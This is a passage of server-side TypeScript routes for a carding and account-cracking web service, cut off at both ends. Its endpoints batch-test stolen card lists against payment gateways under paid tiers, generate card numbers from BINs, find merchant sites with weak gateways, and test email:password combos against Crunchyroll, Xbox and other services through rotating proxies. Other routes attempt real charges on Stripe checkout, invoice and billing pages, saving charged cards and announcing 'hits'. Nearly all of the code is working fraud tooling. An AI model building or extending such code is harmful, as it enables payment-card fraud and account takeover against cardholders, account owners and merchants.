        return res.status(400).json({ error: "No valid cards. Format: CC|MM|YY|CVV" });
      }

      const tier = getUserTier(userId);
      const limits = getTierLimits(tier);
      const isShopify = typeof gateway === "string" && gateway.toLowerCase().startsWith("shp");
      const usageType = isShopify ? "shopifyChecks" as const : "checks" as const;

      if (validCards.length > limits.maxBatchCards) {
        return res.status(400).json({ error: `Your ${tier} plan allows max ${limits.maxBatchCards} cards per batch. Upgrade for more.`, tierLimit: true, tier, limit: limits.maxBatchCards });
      }

      const dailyCheck = checkDailyLimit(userId, usageType);
      if (!dailyCheck.allowed) {
        return res.status(403).json({ error: `Daily ${isShopify ? "Shopify " : ""}check limit reached (${dailyCheck.limit}). Upgrade your plan.`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
      }
      if (dailyCheck.limit !== -1 && validCards.length > dailyCheck.remaining) {
        return res.status(400).json({ error: `Only ${dailyCheck.remaining} checks remaining today. Reduce batch size or upgrade.`, tierLimit: true, tier, remaining: dailyCheck.remaining, limit: dailyCheck.limit });
      }

      for (const [, existingJob] of checkJobs) {
        if (existingJob.userId === userId && existingJob.status === "running") {
          return res.status(409).json({ error: "You already have a running check. Stop it first or wait." });
        }
      }

      incrementUsage(userId, usageType, validCards.length);

      const jobId = crypto.randomBytes(8).toString("hex");
      const jobUserName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || userId;
      const job: CheckJob = {
        id: jobId,
        userId,
        userName: jobUserName,
        isAdmin: req.session?.isAdmin || false,
        gateway: typeof gateway === "string" ? gateway.slice(0, 20) : "shp",
        cards: validCards,
        results: [],
        status: "running",
        totalCards: validCards.length,
        processedCards: 0,
        createdAt: Date.now(),
        aborted: false,
        workers: limits.parallelWorkers,
      };

      checkJobs.set(jobId, job);
      processJob(job);

      res.json({ jobId, totalCards: validCards.length });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/check/batch/:jobId", requireAuth, (req, res) => {
    const job = checkJobs.get(req.params.jobId);
    if (!job) return res.status(404).json({ error: "Job not found" });
    if (job.userId !== req.session?.userId) return res.status(403).json({ error: "Not your job" });

    const afterIndex = parseInt(req.query.after as string) || 0;
    const newResults = job.results.slice(afterIndex);

    res.json({
      jobId: job.id,
      status: job.status,
      gateway: job.gateway,
      totalCards: job.totalCards,
      processedCards: job.processedCards,
      results: newResults,
      allResultsCount: job.results.length,
      createdAt: job.createdAt,
      completedAt: job.completedAt,
    });
  });

  app.delete("/api/check/batch/:jobId", requireAuth, (req, res) => {
    const job = checkJobs.get(req.params.jobId);
    if (!job) return res.status(404).json({ error: "Job not found" });
    if (job.userId !== req.session?.userId) return res.status(403).json({ error: "Not your job" });

    job.aborted = true;
    res.json({ stopped: true });
  });

  app.get("/api/check/batch", requireAuth, (req, res) => {
    const userId = req.session?.userId || "";
    const userJobs = [];
    for (const [, job] of checkJobs) {
      if (job.userId === userId) {
        const charged = job.results.filter(r => r.status === "charged").length;
        const approved = job.results.filter(r => r.status === "approved").length;
        const declined = job.results.filter(r => r.status === "declined").length;
        const errors = job.results.filter(r => r.status === "error" || r.status === "unknown").length;
        userJobs.push({
          jobId: job.id,
          status: job.status,
          gateway: job.gateway,
          totalCards: job.totalCards,
          processedCards: job.processedCards,
          charged,
          approved,
          declined,
          errors,
          createdAt: job.createdAt,
          completedAt: job.completedAt,
        });
      }
    }
    userJobs.sort((a, b) => b.createdAt - a.createdAt);
    res.json(userJobs);
  });

  app.get("/api/checker/gateways", requireAuth, (req, res) => {
    try {
      const allGateways = botManager.getGateways();
      const gateways = allGateways.filter((g: any) => g.enabled);
      res.json(gateways);
    } catch (err: any) {
      res.status(500).json({ message: err.message });
    }
  });

  app.post("/api/tools/generate", requireAuth, async (req, res) => {
    try {
      const { bin, amount, month, year, cvv } = req.body;
      if (!bin || typeof bin !== "string" || !/^[0-9xX]{6,16}$/.test(bin) || bin.replace(/[xX]/g, "").length < 6) {
        return res.status(400).json({ error: "Invalid BIN format. Provide at least 6 digits (use x for random)." });
      }
      const qty = Math.min(Math.max(Number(amount) || 10, 1), 100);

      const botDir = path.resolve(process.cwd(), "bot");
      const toolScript = path.join(botDir, "web_tools.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let errOutput = "";
        const proc = spawn("python3", ["-u", toolScript, "gen", bin, String(qty), month || "xx", year || "xx", cvv || "xxx"], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 15000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });
        proc.on("close", (code) => {
          if (code === 0 && output.trim()) resolve(output.trim());
          else reject(new Error(errOutput.trim() || "Generation failed"));
        });
        proc.on("error", (err) => reject(err));
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      res.json(JSON.parse(jsonLine));
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Generation failed" });
    }
  });

  app.post("/api/tools/filter", requireAuth, async (req, res) => {
    try {
      const { cards } = req.body;
      if (!cards || typeof cards !== "string" || cards.length > 500000) {
        return res.status(400).json({ error: "Invalid or too large input" });
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const toolScript = path.join(botDir, "web_tools.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        const proc = spawn("python3", ["-u", toolScript, "filter"], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 120000,
        });
        proc.stdin?.write(cards);
        proc.stdin?.end();
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", (code) => {
          if (code === 0 && output.trim()) resolve(output.trim());
          else reject(new Error("Filter failed"));
        });
        proc.on("error", (err) => reject(err));
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      res.json(JSON.parse(jsonLine));
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Filter failed" });
    }
  });

  app.get("/api/tools/findsite/gateways", requireAuth, (_req, res) => {
    const botDir = path.resolve(process.cwd(), "bot");
    const script = path.join(botDir, "web_findsite.py");
    let output = "";
    const proc = spawn("python3", ["-u", "-c",
      "import sys; sys.path.insert(0, '.'); from gates.site_finder import SUPPORTED_GATEWAYS; import json; print(json.dumps(SUPPORTED_GATEWAYS))"],
      { cwd: botDir, timeout: 10000 }
    );
    proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
    proc.on("close", () => {
      try {
        res.json(JSON.parse(output.trim()));
      } catch {
        res.json(["stripe", "braintree", "razorpay", "shopify", "paypal", "square", "adyen",
          "authorize.net", "worldpay", "cybersource", "sagepay", "klarna", "mollie", "payu",
          "paystack", "elavon", "heartland"]);
      }
    });
    proc.on("error", () => {
      res.json(["stripe", "braintree", "razorpay", "shopify", "paypal"]);
    });
  });

  app.post("/api/tools/findsite", requireAuth, async (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const tier = getUserTier(userId);
      const limits = getTierLimits(tier);

      if (limits.dailyFindsiteSearches === 0) {
        return res.status(403).json({ error: "Gateway Finder requires Silver or Gold plan.", tierLimit: true, tier });
      }

      const dailyCheck = checkDailyLimit(userId, "findsiteSearches");
      if (!dailyCheck.allowed) {
        return res.status(403).json({ error: `Daily Gateway Finder limit reached (${dailyCheck.limit}/day). ${tier === "silver" ? "Upgrade to Gold for 10/day." : ""}`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
      }

      const { gateway, count } = req.body;
      if (!gateway || typeof gateway !== "string" || !/^[a-z0-9._-]+$/i.test(gateway)) {
        return res.status(400).json({ error: "Invalid gateway" });
      }
      incrementUsage(userId, "findsiteSearches");
      const maxResults = Math.min(Math.max(Number(count) || 10, 1), 25);

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_findsite.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        const proc = spawn("python3", ["-u", script, gateway, String(maxResults)], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 120000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", (code) => {
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Site finder failed"));
        });
        proc.on("error", (err) => reject(err));
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => {
        const trimmed = l.trim();
        return trimmed.startsWith("{") && (trimmed.includes('"found"') || trimmed.includes('"error"'));
      });
      if (!jsonLine) return res.status(500).json({ error: "Invalid response from finder" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Site finder failed" });
    }
  });

  app.post("/api/tools/site-check", requireAuth, async (req, res) => {
    try {
      const { url } = req.body;
      if (!url || typeof url !== "string" || url.trim().length < 4) {
        return res.status(400).json({ error: "Invalid URL" });
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_site_analyzer.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        const proc = spawn("python3", ["-u", script, url.trim()], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 40000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => {
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Site analysis failed"));
        });
        proc.on("error", (err) => reject(err));
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Site analysis failed" });
    }
  });

  const accountCheckRateLimit = new Map<string, number[]>();
  const MAX_ACCOUNT_CHECKS_PER_MINUTE = 60;
  let activeAccountChecks = 0;
  const MAX_CONCURRENT_ACCOUNT_CHECKS = 3;
  const proxyRotationIndex = new Map<string, number>();

  app.get("/api/account-checkers/status", requireAuth, (_req, res) => {
    try {
      const settings = botManager.getBotSettings();
      const checkerIds = ["crunchyroll", "xbox", "cyberghost", "duolingo", "hoichoi"];
      const statuses: Record<string, boolean> = {};
      for (const id of checkerIds) {
        const ts = settings.tool_settings?.[`acc_${id}`];
        statuses[id] = ts?.enabled !== undefined ? ts.enabled : true;
      }
      res.json(statuses);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/tools/account-check/validate-batch", requireAuth, (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const { count } = req.body;
      const batchCount = Number(count) || 1;
      const tier = getUserTier(userId);
      const limits = getTierLimits(tier);

      if (batchCount > limits.massAccountMax) {
        return res.status(403).json({
          allowed: false,
          tier,
          limit: limits.massAccountMax,
          requested: batchCount,
          message: limits.massAccountMax === 1
            ? "Free plan allows single account check only. Upgrade to Silver for mass checking."
            : `Your ${tier} plan allows max ${limits.massAccountMax} combos per batch.`,
        });
      }
      res.json({ allowed: true, tier, limit: limits.massAccountMax });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  const accountCheckSessions = new Map<string, { count: number; startedAt: number }>();

  app.post("/api/tools/account-check", requireAuth, async (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const tier = getUserTier(userId);
      const limits = getTierLimits(tier);
      const now = Date.now();
      const SESSION_WINDOW = 10 * 60 * 1000;

      let session = accountCheckSessions.get(userId);
      if (!session || now - session.startedAt > SESSION_WINDOW) {
        session = { count: 0, startedAt: now };
        accountCheckSessions.set(userId, session);
      }
      session.count++;

      if (session.count > limits.massAccountMax) {
        return res.status(403).json({
          status: "error",
          message: limits.massAccountMax === 1
            ? "Free plan allows single account check only. Upgrade to Silver for mass checking."
            : `Mass check limit reached (${limits.massAccountMax}). Wait 10 min or upgrade.`,
          tierLimit: true,
          tier,
          limit: limits.massAccountMax,
        });
      }

      const clientIp = getClientIp(req);
      const timestamps = accountCheckRateLimit.get(clientIp) || [];
      const recent = timestamps.filter(t => now - t < 60000);
      if (recent.length >= MAX_ACCOUNT_CHECKS_PER_MINUTE) {
        return res.status(429).json({ status: "error", message: "Rate limit exceeded. Try again shortly." });
      }
      recent.push(now);
      accountCheckRateLimit.set(clientIp, recent);

      if (activeAccountChecks >= MAX_CONCURRENT_ACCOUNT_CHECKS) {
        return res.status(503).json({ status: "error", message: "Server busy. Try again shortly." });
      }

      const { checker, combo } = req.body;
      if (!checker || !combo) {
        return res.status(400).json({ status: "error", message: "Missing checker or combo" });
      }

      const validCheckers = ["crunchyroll", "xbox", "cyberghost", "duolingo", "hoichoi"];
      if (!validCheckers.includes(checker)) {
        return res.status(400).json({ status: "error", message: "Invalid checker type" });
      }

      const settings = botManager.getBotSettings();
      const toolKey = `acc_${checker}`;
      const ts = settings.tool_settings?.[toolKey];
      const isEnabled = ts?.enabled !== undefined ? ts.enabled : true;
      if (!isEnabled) {
        return res.status(403).json({ status: "error", message: `${checker} checker is currently disabled.` });
      }

      const comboClean = combo.trim();
      if (!comboClean.includes(":") || comboClean.length > 200) {
        return res.status(400).json({ status: "error", message: "Invalid combo format. Use: email:password" });
      }

      const [user, ...passParts] = comboClean.split(":");
      const password = passParts.join(":");
      if (!user || !password) {
        return res.status(400).json({ status: "error", message: "Invalid combo. Both email and password required." });
      }

      activeAccountChecks++;
      const botDir = path.resolve(process.cwd(), "bot");
      const checkerScript = path.join(botDir, "web_account_checker.py");

      try {
        const userId = req.session?.userId || "";
        const proxyData = loadUserProxies();
        const userProxies = proxyData[userId]?.proxies || [];
        let proxy = "";
        if (userProxies.length > 0) {
          const idx = proxyRotationIndex.get(userId) || 0;
          proxy = userProxies[idx % userProxies.length];
          proxyRotationIndex.set(userId, idx + 1);
        }

        const args = ["-u", checkerScript, checker, user, password];
        if (proxy) args.push(proxy);

        const result = await new Promise<string>((resolve, reject) => {
          let output = "";
          let errOutput = "";
          const proc = spawn("python3", args, {
            cwd: botDir,
            env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
            timeout: 30000,
          });

          proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
          proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });

          proc.on("close", (code) => {
            if (code === 0 && output.trim()) {
              resolve(output.trim());
            } else {
              reject(new Error(errOutput.slice(0, 300) || `Process exited with code ${code}`));
            }
          });

          proc.on("error", (err) => reject(err));
        });

        const lines = result.split("\n");
        const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
        if (!jsonLine) {
          return res.status(500).json({ status: "error", message: "Invalid checker response" });
        }
        const accResult = JSON.parse(jsonLine);
        res.json(accResult);

        if (accResult.status === "hit" || accResult.status === "premium" || accResult.status === "valid") {
          const accUserName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";
          addActivity({
            type: "account_hit",
            userName: accUserName,
            userId: req.session?.userId || "",
            message: `${accUserName} Got Account Hit ⚡`,
            detail: `${checker} — ${accResult.message || accResult.status}`,
          });
        }
      } finally {
        activeAccountChecks--;
      }
    } catch (err: any) {
      res.status(500).json({ status: "error", message: err.message?.slice(0, 200) || "Check failed" });
    }
  });

  const hitterHistoryFile = path.join(path.resolve(process.cwd(), "bot"), "hitter_history.json");
  const savedBinsFile = path.join(path.resolve(process.cwd(), "bot"), "saved_bins.json");

  function loadSavedBins(): Record<string, { bin: string; label: string }[]> {
    try {
      if (fs.existsSync(savedBinsFile)) {
        return JSON.parse(fs.readFileSync(savedBinsFile, "utf-8"));
      }
    } catch {}
    return {};
  }

  function saveSavedBins(data: Record<string, { bin: string; label: string }[]>) {
    fs.writeFileSync(savedBinsFile, JSON.stringify(data, null, 2));
    saveJsonFile("saved_bins.json").catch(() => {});
    debouncedSaveJson();
  }

  app.get("/api/tools/saved-bins", requireAuth, (req, res) => {
    const userId = req.session!.userId;
    const all = loadSavedBins();
    res.json({ bins: all[userId!] || [] });
  });

  app.post("/api/tools/saved-bins", requireAuth, (req, res) => {
    const userId = req.session!.userId!;
    const { bin, label } = req.body;
    if (!bin || typeof bin !== "string" || bin.trim().length < 6) {
      return res.status(400).json({ error: "BIN must be at least 6 digits" });
    }
    const cleanBin = bin.trim().slice(0, 16);
    const cleanLabel = (label && typeof label === "string") ? label.trim().slice(0, 50) : cleanBin.slice(0, 6);

    const all = loadSavedBins();
    if (!all[userId]) all[userId] = [];
    if (all[userId].length >= 20) {
      return res.status(400).json({ error: "Max 20 saved BINs allowed" });
    }
    if (all[userId].some(b => b.bin === cleanBin)) {
      return res.status(400).json({ error: "BIN already saved" });
    }
    all[userId].push({ bin: cleanBin, label: cleanLabel });
    saveSavedBins(all);
    res.json({ bins: all[userId] });
  });

  app.delete("/api/tools/saved-bins", requireAuth, (req, res) => {
    const userId = req.session!.userId!;
    const { bin } = req.body;
    if (!bin) return res.status(400).json({ error: "BIN required" });

    const all = loadSavedBins();
    if (!all[userId]) return res.json({ bins: [] });
    all[userId] = all[userId].filter(b => b.bin !== bin);
    if (all[userId].length === 0) delete all[userId];
    saveSavedBins(all);
    res.json({ bins: all[userId] || [] });
  });

  function loadHitterHistory(): Record<string, any[]> {
    try {
      if (fs.existsSync(hitterHistoryFile)) {
        return JSON.parse(fs.readFileSync(hitterHistoryFile, "utf-8"));
      }
    } catch {}
    return {};
  }

  function saveHitterHistory(data: Record<string, any[]>) {
    fs.writeFileSync(hitterHistoryFile, JSON.stringify(data, null, 2));
    saveJsonFile("hitter_history.json").catch(() => {});
    debouncedSaveJson();
  }

  app.get("/api/tools/hitter-history", requireAuth, (req, res) => {
    const userId = req.session!.userId;
    const all = loadHitterHistory();
    const userHistory = all[userId] || [];
    res.json({ sessions: userHistory });
  });

  app.post("/api/tools/hitter-history", requireAuth, (req, res) => {
    const userId = req.session!.userId;
    const { session } = req.body;
    if (!session) return res.status(400).json({ error: "Missing session data" });
    const all = loadHitterHistory();
    if (!all[userId]) all[userId] = [];
    all[userId].unshift(session);
    all[userId] = all[userId].slice(0, 5);
    saveHitterHistory(all);
    res.json({ saved: true });
  });

  app.post("/api/tools/stripe-co", requireAuth, async (req, res) => {
    try {
      const { checkoutUrl, card, sessionCache } = req.body;
      if (!checkoutUrl || typeof checkoutUrl !== "string") {
        return res.status(400).json({ error: "Missing checkout URL" });
      }
      if (!card || typeof card !== "string" || !/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(card)) {
        return res.status(400).json({ error: "Invalid card format. Use cc|mm|yy|cvv" });
      }

      const hitterCheck = checkDailyLimit(req.session?.userId || "", "hitterHits");
      if (!hitterCheck.allowed) {
        return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: hitterCheck.limit, used: hitterCheck.used });
      }
      const reqIp = getClientIp(req);
      if (hitterCheck.limit !== -1) {
        const ipCheck = checkIpHitterLimit(reqIp);
        if (!ipCheck.allowed) {
          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 2, used: ipCheck.used, reason: "IP daily limit reached" });
        }
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_stripe_co.py");

      const args = ["-u", script, checkoutUrl, card];
      const allowedCacheKeys = ["pk", "session_id", "merchant", "amount", "currency",
        "stripe_js_version", "billing_required", "customer_email"];
      if (sessionCache && typeof sessionCache === "object" && !Array.isArray(sessionCache)) {
        const sanitized: Record<string, any> = {};
        for (const key of allowedCacheKeys) {
          if (key in sessionCache) sanitized[key] = sessionCache[key];
        }
        args.push(JSON.stringify(sanitized));
      } else {
        args.push("null");
      }

      const userId = req.session?.userId || "";
      let proxy = "";
      try {
        const uProxies = loadUserProxies()[userId]?.proxies || [];
        if (uProxies.length > 0) {
          const idx = proxyRotationIndex.get(userId) || 0;
          proxy = uProxies[idx % uProxies.length];
          proxyRotationIndex.set(userId, idx + 1);
        }
      } catch {}
      args.push(proxy || "null");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", args, {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 90000,
        });

        const cleanup = () => {
          if (!settled && !res.writableEnded) {
            settled = true;
            try { proc.kill("SIGTERM"); } catch {}
            setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 2000);
            reject(new Error("Client disconnected"));
          }
        };
        req.socket?.on("close", cleanup);

        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        let stderrBuf = "";
        proc.stderr?.on("data", (data: Buffer) => { stderrBuf += data.toString(); });
        proc.on("close", (code) => {
          if (settled) return;
          settled = true;
          req.socket?.removeListener("close", cleanup);
          if (stderrBuf.trim()) {
            const lines = stderrBuf.trim().split("\n").slice(-15);
            console.log(`[stripe-co-debug] ${lines.join("\n[stripe-co-debug] ")}`);
          }
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Stripe CO check failed"));
        });
        proc.on("error", (err) => {
          if (settled) return;
          settled = true;
          req.socket?.removeListener("close", cleanup);
          reject(err);
        });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });

      const cardClean = card.replace(/\|/g, "|");
      const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";

      if (data.status === "charged" && req.session?.userId) {
        const botDir2 = path.resolve(process.cwd(), "bot");
        const forwardScript = path.join(botDir2, "web_forward_hit.py");
        const freshCache = data.session_cache || {};
        const merchantName = freshCache.merchant || (sessionCache as any)?.merchant || "";
        const rawAmount = freshCache.amount ?? (sessionCache as any)?.amount;
        const rawCurrency = (freshCache.currency || "").toUpperCase();
        const zeroDecimalCurrencies = ["BIF","CLP","DJF","GNF","JPY","KMF","KRW","MGA","PYG","RWF","UGX","VND","VUV","XAF","XOF","XPF"];
        const amount = (rawAmount != null && rawAmount !== "") ? `${zeroDecimalCurrencies.includes(rawCurrency) ? rawAmount : (Number(rawAmount) / 100).toFixed(2)} ${rawCurrency}` : "";
        const successUrl = freshCache.success_url || (sessionCache as any)?.success_url || "";
        const adminSite = (() => { try { return successUrl ? new URL(successUrl.replace(/\{[^}]+\}/g, "x")).hostname.replace(/^www\./, "") : ""; } catch { return ""; } })();

        spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe CO", data.message || "Charged", userName, merchantName, amount, checkoutUrl, adminSite], {
          cwd: botDir2,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 15000,
          stdio: "ignore",
        });

        incrementUsage(req.session.userId, "hitterHits");
        incrementIpHitterUsage(reqIp);
        saveChargedCC(cardClean, "Stripe CO", req.session.userId, userName);
        sendGroupLog(userName, req.session.userId, cardClean, "Stripe CO", data.message || "Charged", "auto_hitter", merchantName, amount, adminSite);
        addActivity({
          type: "hit",
          userName,
          userId: req.session.userId,
          message: `${userName} Got Hit ⚡`,
          detail: `Charged — Stripe Checkout`,
        });
      }

      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Stripe CO failed" });
    }
  });

  app.post("/api/tools/stripe-invoice", requireAuth, async (req, res) => {
    try {
      const { invoiceUrl, card, sessionCache } = req.body;
      if (!invoiceUrl || typeof invoiceUrl !== "string") {
        return res.status(400).json({ error: "Missing invoice URL" });
      }
      try {
        const parsed = new URL(invoiceUrl);
        if (parsed.protocol !== "https:" || parsed.hostname !== "invoice.stripe.com" || !parsed.pathname.match(/^\/i\/[^/]+\/[^/]+$/)) {
          return res.status(400).json({ error: "Invalid Stripe invoice URL format" });
        }
      } catch {
        return res.status(400).json({ error: "Invalid URL" });
      }
      if (!card || typeof card !== "string" || !/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(card)) {
        return res.status(400).json({ error: "Invalid card format. Use cc|mm|yy|cvv" });
      }

      const hitterCheck = checkDailyLimit(req.session?.userId || "", "hitterHits");
      if (!hitterCheck.allowed) {
        return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: hitterCheck.limit, used: hitterCheck.used });
      }
      const reqIp = getClientIp(req);
      if (hitterCheck.limit !== -1) {
        const ipCheck = checkIpHitterLimit(reqIp);
        if (!ipCheck.allowed) {
          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 2, used: ipCheck.used, reason: "IP daily limit reached" });
        }
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_stripe_invoice.py");

      const args = ["-u", script, invoiceUrl, card];
      const allowedCacheKeys = ["pk", "ek", "pi_id", "pi_cs", "invoice_id", "merchant", "amount", "currency",
        "email", "billing_required"];
      if (sessionCache && typeof sessionCache === "object" && !Array.isArray(sessionCache)) {
        const sanitized: Record<string, any> = {};
        for (const key of allowedCacheKeys) {
          if (key in sessionCache) sanitized[key] = sessionCache[key];
        }
        args.push(JSON.stringify(sanitized));
      } else {
        args.push("null");
      }

      const userId = req.session?.userId || "";
      let proxy = "";
      try {
        const uProxies = loadUserProxies()[userId]?.proxies || [];
        if (uProxies.length > 0) {
          const idx = proxyRotationIndex.get(userId) || 0;
          proxy = uProxies[idx % uProxies.length];
          proxyRotationIndex.set(userId, idx + 1);
        }
      } catch {}
      args.push(proxy || "null");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", args, {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 90000,
        });

        const cleanup = () => {
          if (!settled && !res.writableEnded) {
            settled = true;
            try { proc.kill("SIGTERM"); } catch {}
            setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 2000);
            reject(new Error("Client disconnected"));
          }
        };
        req.socket?.on("close", cleanup);

        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        let stderrBuf = "";
        proc.stderr?.on("data", (data: Buffer) => { stderrBuf += data.toString(); });
        proc.on("close", (code) => {
          if (settled) return;
          settled = true;
          req.socket?.removeListener("close", cleanup);
          if (stderrBuf.trim()) {
            const lines = stderrBuf.trim().split("\n").slice(-15);
            console.log(`[stripe-invoice-debug] ${lines.join("\n[stripe-invoice-debug] ")}`);
          }
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Stripe invoice check failed"));
        });
        proc.on("error", (err) => {
          if (settled) return;
          settled = true;
          req.socket?.removeListener("close", cleanup);
          reject(err);
        });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });

      const cardClean = card.replace(/\|/g, "|");
      const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";

      if (data.status === "charged" && req.session?.userId) {
        const botDir2 = path.resolve(process.cwd(), "bot");
        const forwardScript = path.join(botDir2, "web_forward_hit.py");
        const freshCache = data.session_cache || {};
        const merchantName = freshCache.merchant || (sessionCache as any)?.merchant || "";
        const rawAmount = freshCache.amount ?? (sessionCache as any)?.amount;
        const rawCurrency = (freshCache.currency || "").toUpperCase();
        const zeroDecimalCurrencies = ["BIF","CLP","DJF","GNF","JPY","KMF","KRW","MGA","PYG","RWF","UGX","VND","VUV","XAF","XOF","XPF"];
        const amount = (rawAmount != null && rawAmount !== "") ? `${zeroDecimalCurrencies.includes(rawCurrency) ? rawAmount : (Number(rawAmount) / 100).toFixed(2)} ${rawCurrency}` : "";

        spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", userName, merchantName, amount, invoiceUrl, ""], {
          cwd: botDir2,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 15000,
          stdio: "ignore",
        });

        incrementUsage(req.session.userId, "hitterHits");
        incrementIpHitterUsage(reqIp);
        saveChargedCC(cardClean, "Stripe Invoice", req.session.userId, userName);
        sendGroupLog(userName, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", "auto_hitter", merchantName, amount);
        addActivity({
          type: "hit",
          userName,
          userId: req.session.userId,
          message: `${userName} Got Hit ⚡`,
          detail: `Charged — Stripe Invoice`,
        });
      }

      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Stripe Invoice failed" });
    }
  });

  app.post("/api/tools/stripe-billing", requireAuth, async (req, res) => {
    try {
      const { billingUrl, card, sessionCache } = req.body;
      if (!billingUrl || typeof billingUrl !== "string") {
        return res.status(400).json({ error: "Missing billing portal URL" });
      }
      try {
        const parsedUrl = new URL(billingUrl);
        if (parsedUrl.protocol !== "https:" || parsedUrl.hostname !== "billing.stripe.com" || !parsedUrl.pathname.startsWith("/p/session/")) {
          return res.status(400).json({ error: "Invalid billing portal URL. Must be https://billing.stripe.com/p/session/..." });
        }
      } catch {
        return res.status(400).json({ error: "Invalid billing portal URL" });
      }
      if (!card || typeof card !== "string" || !/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(card)) {
        return res.status(400).json({ error: "Invalid card format. Use cc|mm|yy|cvv" });
      }

      const billingHitterCheck = checkDailyLimit(req.session?.userId || "", "hitterHits");
